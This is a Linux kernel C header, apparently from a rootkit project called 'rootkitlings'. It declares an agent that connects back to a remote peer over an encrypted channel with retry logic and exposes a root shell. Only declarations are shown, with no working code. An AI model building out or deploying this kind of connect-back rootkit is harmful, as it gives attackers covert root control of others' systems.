/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_AGENT_H
#define ROOTKITLINGS_AGENT_H

#include <linux/compiler_attributes.h>
#include <linux/in.h>
#include <linux/mutex.h>
#include <linux/types.h>
#include <linux/wait.h>

#include "framing.h"
#include "protocol.h"
#include "secure_control.h"

struct socket;
struct rk_root_shell;
struct task_struct;

struct rk_agent {
	struct mutex lock;
	wait_queue_head_t retry_wait;
	struct task_struct *task;
	struct socket *active;
	struct sockaddr_in peer;
	struct rk_root_shell *shell;
	u8 key[RK_AEAD_KEY_LENGTH];
	bool initialized;
	bool stopping;
	bool connected;
	bool shutdown_started;
	bool shell_enabled;
	unsigned int retry_base_ms;
	unsigned int retry_max_ms;
	unsigned int retry_delay_ms;
	u64 attempts;
	u64 connections;
	u64 commands;
	u64 retries;
	u64 transport_errors;
	u64 protocol_errors;
	u64 session;
	struct rk_secure_channel secure;
};

__must_check int rk_agent_start(struct rk_agent *agent,
				__be32 peer_address, u16 peer_port,
				unsigned int retry_base_ms,
				unsigned int retry_max_ms,
				const u8 *key, size_t key_length,
				struct rk_root_shell *shell);
void rk_agent_stop(struct rk_agent *agent);

#endif
